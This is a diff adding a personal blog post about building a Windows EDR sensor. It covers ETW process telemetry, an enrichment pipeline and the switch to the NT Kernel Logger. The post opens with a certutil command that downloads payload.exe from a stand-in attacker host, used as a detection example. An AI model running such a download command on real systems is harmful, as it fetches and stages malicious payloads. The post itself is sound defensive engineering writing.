@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Where Did That Process Go? Building an EDR Part 1 — Aadil Varshani</title>
+<meta name="description" content="Building an EDR sensor from scratch: how ETW works, the acquisition-vs-enrichment split, and the wall I hit trying to get a ProcessStart event on Windows 11.">
+<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="header-inner">
+    <a href="../index.html#home" class="logo">
+      <span class="logo-dot"></span>
+      Aadil Varshani
+    </a>
+
+    <nav class="nav-links" id="nav-links">
+      <a href="../index.html#home">./home</a>
+      <a href="../index.html#experience">./experience</a>
+      <a href="../index.html#projects">./projects</a>
+      <a href="./index.html">./blog</a>
+      <a href="../index.html#contact">./contact</a>
+    </nav>
+
+    <div class="header-status">
+      <span class="status-dot"></span>
+      IST <span id="clock">00:00:00</span>
+    </div>
+
+    <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+<main id="home">
+
+  <div class="post-header">
+    <a href="./index.html" class="back-link">&larr; ./blog</a>
+    <p class="post-meta">// Detection Engineering &mdash; Part 1</p>
+    <h1 class="post-title">Where Did That Process Go? Building an EDR Part 1</h1>
+  </div>
+
+  <article class="post-body">
+
+<pre><code>certutil -urlcache -f http://evil.site/payload.exe update.exe</code></pre>
+
+<p>If you saw that command run on a machine you were responsible for, you'd know instantly something was wrong. <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank" rel="noopener noreferrer">certutil</a> is a legitimate, Microsoft signed binary that ships with every copy of Windows. It's also one of the most abused living off the land tools out there, because a path only check sees nothing suspicious here. <code>C:\Windows\System32\certutil.exe</code> is exactly where it's supposed to be, signed by exactly who you'd expect. The command line is the entire attack.</p>
+
+<p>So here's the question that actually kicked this whole project off. How does EDR find out that Windows created another process the instant it happens, with enough detail to decide if it's malicious? Not "how does it decide the command is bad," that's a detection logic problem, further downstream. I mean the mechanical question underneath it: your EDR is just another process running on the OS, with no special X-ray vision into anything. How does it find out, in real time, that a process was even created, let alone what it was told to do?</p>
+
+<p>That question is why I started building my own EDR sensor from scratch. This post is the introduction to that series: what the project is, why I'm doing it, what I've built so far, and the first real wall I hit.</p>
+
+<h2>Why build an EDR when EDRs already exist</h2>
+
+<p>Most of what I do day to day is write and tune detection rules against telemetry that's already been captured, normalized, and shipped to me by someone else's sensor. That's real, valuable work, but it left a gap in my head. I could write a detection rule against a processrollup2 event all day and never once have built the thing that actually produces one.</p>
+
+<p>This project is me closing that gap on purpose. The goal isn't to ship a product, it's to build every layer of an endpoint sensor by hand, understand exactly which Windows component tells you what, and come out the other side able to reason about EDR internals the way I currently reason about detection rules. I'm calling the sensor <a href="https://github.com/aadilvarshani/reaperwatch" target="_blank" rel="noopener noreferrer">ReaperWatch</a>, and I'm building it in phases, starting from user mode and working my way down toward the kernel.</p>
+
+<h2>The mental model: acquisition, then enrichment</h2>
+
+<p><em><strong>Your agent is just another process</strong></em>. It has no magic X-ray vision into the OS. To observe process creation it must subscribe to a notification mechanism that Windows provides. Windows offers several such mechanisms, each sitting at a different layer of the OS. The layer you pick decides three things: <strong>how early you find</strong> out, <strong>how much detail</strong> you get, and <strong>how much it cost</strong>s in performance and risk. Once you get the notification, it only contains the basics, so you then enrich it by actively querying the OS for the rest (hashes, signature, user, etc.), assemble a normalized event, and ship it onward.</p>
+
+<p><strong>Two phases, always:</strong></p>
+
+<figure>
+  <img src="images/acquisition-enrichment-pipeline.png" alt="Diagram: Acquisition (a process just started) flows into Enrichment (go get the details), which feeds a pipeline that normalizes, ships, and detects.">
+</figure>
+
+<p>You cannot understand Windows telemetry without this. The CPU enforces two privilege levels ("rings"):</p>
+
+<table>
+  <tbody>
+    <tr><td></td><td><strong>User mode (ring 3)</strong></td><td><strong>Kernel mode (ring 0)</strong></td></tr>
+    <tr><td><strong>Who runs here</strong></td><td>Normal apps: browsers</td><td>OS core + device drivers</td></tr>
+    <tr><td><strong>Power</strong></td><td>Sandboxed, limited</td><td>Full access to hardware &amp; memory</td></tr>
+    <tr><td><strong>If it crashes</strong></td><td>Only that process dies</td><td>Blue Screen of Death</td></tr>
+    <tr><td><strong>Talks to hardware</strong></td><td>No</td><td>Yes, directly</td></tr>
+  </tbody>
+</table>
+
+<p>When a user-mode program wants the OS to do something privileged (open a file, create a process), it makes a system call that transitions the CPU from ring 3 into ring 0, runs the kernel code, and returns.</p>
+
+<p>A process is actually born inside the kernel. The internal routine is NtCreateUserProcess. So the kernel witnesses process creation first and most completely. Anything running in user mode only ever sees a reported echo of an event the kernel already handled.</p>
+
+<p>This is why every serious EDR needs a presence in both places:</p>
+
+<ul>
+  <li><strong>A kernel driver</strong>: sees ground truth earliest, and can even block a process before it executes a single instruction.</li>
+  <li><strong>A user-mode agent</strong>: does the heavy, risky analysis (hashing, parsing, signature checks) where a crash is safe and won't take down the customer's machine.</li>
+</ul>
+
+<p>The piece I've finished, <strong>A user-mode agent</strong>. And every sensor design like this really breaks into two phases. First, acquisition: the bare notification that a process just started. Then enrichment: actually going and getting the details an analyst needs to make a call. That split matters because the notification you get is thin. Whatever mechanism you use to learn a process started, it hands you a PID and maybe a couple of fields, not a hash, not a signature, not a parent's creation time. You have to go fetch the rest yourself, and that fetching turns out to be most of the interesting engineering.</p>
+
+<h2>Picking an acquisition mechanism</h2>
+
+<table>
+  <tbody>
+    <tr><td><strong>Mechanism</strong></td><td><strong>Runs in</strong></td><td><strong>Catches short-lived processes?</strong></td><td><strong>Cost</strong></td></tr>
+    <tr>
+      <td>Polling (<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" target="_blank" rel="noopener noreferrer"><code>CreateToolhelp32Snapshot</code></a>, diffing snapshots)</td>
+      <td>User mode</td>
+      <td>No, a process living between two snapshots is invisible</td>
+      <td>Trivial to write, useless for our use case</td>
+    </tr>
+    <tr>
+      <td>WMI (<a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-processstarttrace" target="_blank" rel="noopener noreferrer"><code>Win32_ProcessStartTrace</code></a>)</td>
+      <td>User mode</td>
+      <td>Unreliable under load, commonly reported to drop events (I haven't measured this myself)</td>
+      <td>No driver, but higher latency</td>
+    </tr>
+    <tr>
+      <td><a href="https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing" target="_blank" rel="noopener noreferrer">ETW</a></td>
+      <td>User mode</td>
+      <td>Yes</td>
+      <td>Steepest API to learn, what I chose</td>
+    </tr>
+    <tr>
+      <td>Kernel callback (<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2" target="_blank" rel="noopener noreferrer"><code>PsSetCreateProcessNotifyRoutineEx2</code></a>)</td>
+      <td>Kernel driver</td>
+      <td>Yes, and can block the process outright</td>
+      <td>Requires writing, signing, and loading a driver, a bug is a blue screen, not a crash log</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3>Why ETW for now, and not the kernel callback right away:</h3>
+
+<p>ETW gets you real breadth (it catches short-lived processes, unlike polling or WMI) without the cost that actually gates the rest of the project: you don't need to write, sign, and load a kernel driver to use it. That matters a lot at this stage, because a bug in a kernel driver means it's a blue screen, and I genuinely wanted to learn ETW properly before touching kernel work at all. Almost everything I'm building here, the enrichment pipeline especially, carries straight over once I do move to a kernel driver; only the acquisition step at the front changes.</p>
+
+<h2>How ETW actually works</h2>
+
+<figure>
+  <img src="images/etw-provider-session-consumer.png" alt="ETW architecture diagram: Provider (Kernel-Process, emits events) flows to Session (controller you start), which flows to Consumer (your callback, real time).">
+</figure>
+
+<ul>
+  <li>Provider: a component that <em>emits</em> events. Each is identified by a <strong>GUID</strong>. The one we want is <code>Microsoft-Windows-Kernel-Process</code> (<code>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</code>). It fires a <strong><code>ProcessStart</code></strong> event on every creation, carrying <code>ProcessID</code>, <code>ParentProcessID</code>, <code>ImageName</code>, <code>CommandLine</code>, <code>SessionID</code>, and more.</li>
+  <li><strong>Session / controller:</strong> you <em>start a trace session</em> (via <a href="https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-starttracea" target="_blank" rel="noopener noreferrer"><code>StartTrace</code></a> / <a href="https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-enabletraceex2" target="_blank" rel="noopener noreferrer"><code>EnableTraceEx2</code></a>) that says "record events from provider X." A session is a named, system-managed buffer.</li>
+  <li><strong>Consumer:</strong> you <em>open</em> the session (<a href="https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-opentracea" target="_blank" rel="noopener noreferrer"><code>OpenTrace</code></a>) and call <a href="https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-processtrace" target="_blank" rel="noopener noreferrer"><code>ProcessTrace</code></a>; Windows then invokes <strong>your callback</strong> for each event in real time. You decode the event's fields using <a href="https://learn.microsoft.com/en-us/windows/win32/api/tdh/" target="_blank" rel="noopener noreferrer">TDH</a> (Trace Data Helper) APIs.</li>
+</ul>
+
+<p><em><strong>The event flow for a single process launch:</strong></em></p>
+
+<figure>
+  <img src="images/etw-process-start-event-flow.png" alt="Diagram: NtCreateUserProcess triggers the Kernel-Process provider to fire a ProcessStart event (pid, ppid, image, cmdline, session), buffered by the ETW session, delivered to the consumer callback.">
+</figure>
+
+<h2>Building the enrichment pipeline</h2>
+
+<p>The ETW event I get is thin: pid, parent pid, image name, command line. Everything else, whether the file can be trusted, who's actually running it, whether this is even a legitimate parent, I have to go get myself. That gap is the whole reason enrichment exists, and I built it as a series of small, independently testable steps: each one owns exactly one missing field, and each one I could test against any PID on my main machine, before ETW itself was wired up.</p>
+
+<p>Start with the file. A path tells you what something's called and where it sits, not whether you can trust it. <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="noopener noreferrer"><code>OpenProcess</code></a> (with the narrowest access right that still works) plus <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queryfullprocessimagenamew" target="_blank" rel="noopener noreferrer"><code>QueryFullProcessImageNameW</code></a> gets you that path, and location alone is already a signal: a legitimately-named binary running out of <code>Temp</code> reads very differently than the same name sitting in <code>System32</code>.</p>
+
+<p>But a path can be copied, and a name means nothing. What can't be faked is the file's actual content, so the next step is hashing it: SHA-256 and MD5, streamed 64KB at a time through <a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-portal" target="_blank" rel="noopener noreferrer">CNG</a> so a multi-hundred-MB binary doesn't blow out memory on something running on every endpoint. Rename a piece of malware to <code>svchost.exe</code> and the path check won't catch it. The hash will. I cross-checked the streaming logic byte-for-byte against <code>certutil -hashfile</code> to make sure it wasn't quietly corrupting anything along the way.</p>
+
+<p>Knowing the hash raises the obvious next question: who signed this file? That's the signature check, and it's where I hit something I didn't expect. Most third-party software carries its signature embedded directly in the file, so checking the file alone tells you everything. Plenty of core Windows binaries don't: <code>cmd.exe</code> carries no signature inside the file at all. Windows instead verifies these against system catalog files that list the hashes of thousands of OS binaries, so my check tries the embedded path first and falls back to the catalog if the file itself carries nothing. I confirmed this directly: <code>explorer.exe</code> verifies through its own embedded signature; <code>cmd.exe</code> and <code>notepad.exe</code> only verify through the catalog. All three come back signed, with the correct signer, because all three genuinely are signed, just through different mechanisms.</p>
+
+<pre><code>{
+  "event_type": "process_create",
+  "process": {
+    "name": "cmd.exe",
+    "path": "C:\\Windows\\System32\\cmd.exe",
+    "cmdline": "\"C:\\Windows\\System32\\cmd.exe\" ",
+    "sha256": "486aa8ac1661c0dc08d3ebea4f25f0009d248f2ced111dea8587c2b7d71b49bb",
+    "signed": true,
+    "signer": "Microsoft Windows"
+  },
+  "parent": { "name": "powershell.exe", "pid": 7284 },
+  "grandparent": { "name": "explorer.exe", "pid": 5108 }
+}</code></pre>
+
+<p>That closes out what the file is. The next question is who's behind it, and that's a different kind of evidence entirely: lineage and identity.</p>
+
+<p>Lineage first. <code>winword.exe</code> spawning <code>cmd.exe</code> spawning <code>powershell.exe</code> is a classic macro-attack chain; <code>services.exe</code> spawning <code>svchost.exe</code> is normal. This sounds like a simple lookup, walk up the process tree, done, except Windows recycles PIDs. The parent PID recorded at a process's birth might belong to an entirely different process by the time you go check it, so the lookup alone isn't enough. The fix is comparing creation timestamps: a real parent has to be strictly older than its child, or the lineage gets thrown out as recycled.</p>
+
+<p>One field got its own dedicated task instead of folding into any of the above: the command line. Go back to the <code>certutil</code> command that opened this post. The path and the hash tell you what ran. The command line tells you what it was doing, and that's exactly where an attack like that one lives. There's no API that just hands you another process's command line, <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew" target="_blank" rel="noopener noreferrer"><code>GetCommandLineW</code></a> only ever returns your own, so getting someone else's means reading their memory directly: their <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank" rel="noopener noreferrer">PEB</a>, then <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank" rel="noopener noreferrer"><code>RTL_USER_PROCESS_PARAMETERS</code></a>, then the command line string itself, which lives in a <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string" target="_blank" rel="noopener noreferrer"><code>UNICODE_STRING</code></a> whose length field is measured in bytes, not characters. Get that detail wrong and you either truncate the string in half or read garbage past the end of it.</p>
+
+<figure>
+  <img src="images/reading-remote-command-line.png" alt="Diagram: OpenProcess + NtQueryInformationProcess gets the PEB address, then three ReadProcessMemory hops through the PEB and RTL_USER_PROCESS_PARAMETERS reach the UTF-16 command line text.">
+</figure>
+
+<p>Two smaller pieces close this out. Host context is just the hostname, OS version, and architecture, and even this has a trap: <a href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexa" target="_blank" rel="noopener noreferrer"><code>GetVersionEx</code></a> has quietly returned the wrong Windows version since Windows 8.1 unless the calling app declares compatibility with the newer OS in its manifest. Rather than deal with that, I used <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion" target="_blank" rel="noopener noreferrer"><code>RtlGetVersion</code></a> instead.</p>
+
+<p>Assembly is simpler: take everything gathered above and pack it into one JSON object per process. Each event also gets a sequence number handed out by a single atomic counter, so two threads can never produce the same number by accident. That number is what makes it possible to notice a dropped event later: if event 104 shows up right after event 102, you know 103 never arrived, whether from a bug or the agent falling behind. Nothing acts on that signal yet, but the number is there for when something does.</p>
+
+<h2>Where the plan met reality</h2>
+
+<p>The last piece was wiring all of this to a live event source, and it's where I hit the wall I mentioned back at the start of this post.</p>
+
+<p>My first attempt subscribed to the modern manifest provider, <code>Microsoft-Windows-Kernel-Process</code>, using <code>EnableTraceEx2</code> with the process keyword. It compiled. It ran. It delivered thread events, image-load events, priority-change events, real data flowing in. It never once delivered a <code>ProcessStart</code> event, ID 1, on this Windows 11 build. Not delivered late, not delivered sometimes. Never.</p>
+
+<pre><code>id=0   count=4     // not sure what lol?
+id=3   count=159   // ThreadStart
+id=4   count=63    // ThreadStop
+id=5   count=355   // ImageLoad
+id=6   count=258   // ImageUnload
+id=7   count=395   // CpuBasePriorityChange
+id=8   count=258   // CpuPriorityChange
+id=9   count=12    // PagePriorityChange
+id=21  count=2386  // ThreadWorkOnBehalfUpdate</code></pre>
+
+<p>Everything the provider fires as a side effect of ordinary Windows activity showed up fine. The two IDs that actually define a process sensor, start and stop, never did.</p>
+
+<p>id 1 (ProcessStart) and id 2 (ProcessStop), the two I actually needed, don't appear anywhere in that list. Not a low count. Absent.</p>
+
+<p>The fix was dropping down a level, to the classic <a href="https://learn.microsoft.com/en-us/windows/win32/etw/nt-kernel-logger-constants" target="_blank" rel="noopener noreferrer">NT Kernel Logger</a>, the same mechanism <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener noreferrer">Process Monitor</a> relies on. It doesn't use the manifest-subscription model at all, you enable it with flags at session creation instead. Switching to it worked immediately.</p>
+
+<p>That's the sensor as it stands today: NT Kernel Logger for acquisition, the pipeline above for enrichment, one normalized JSON event per process launch, live, on a real machine.</p>
+
+<h2>What's still open</h2>
+
+<p>There's a real limitation underneath all of this. My enrichment runs after the ETW event fires. I get a PID, then call <code>OpenProcess</code>, read memory, hash the file, all of which takes real time. If the process is already gone by the time I get to it, I'm left with null fields where the path, hash, and signature should be.</p>
+
+<p>This isn't just a concern about attackers running something short-lived on purpose. Watching this run on my own machine, with nothing malicious happening at all, plenty of ordinary processes still come back with null fields. They just didn't live long enough for enrichment to catch up before they exited.</p>
+
+<p>That's the acquisition-versus-enrichment split from the start of this post catching up with me. A user-mode agent, however careful, only finds out after the fact. Closing that gap means moving acquisition into the kernel, the half I deferred at the beginning. That's Part 2.</p>
+
+<p>This is Part 1 of a series I'm building in public. The agent as it stands today is one phase, user mode, ETW-based, with the enrichment pipeline above. Part 2 covers moving acquisition into the kernel and what actually closing the TOCTOU gap from the last section takes.</p>
+
+  </article>
+
+</main>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span>Aadil Varshani</span>
+    <div class="footer-links">
+      <a href="../index.html#home" aria-label="Home">home</a>
+      <a href="https://github.com/aadilvarshani" target="_blank" rel="noopener noreferrer" aria-label="GitHub">gh</a>
+      <a href="https://linkedin.com/in/aadil-varshani" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">in</a>
+      <span class="status-dot"></span>
+    </div>
+  </div>
+</footer>
+
+<script src="../js/script.js"></script>
+</body>
+</html>
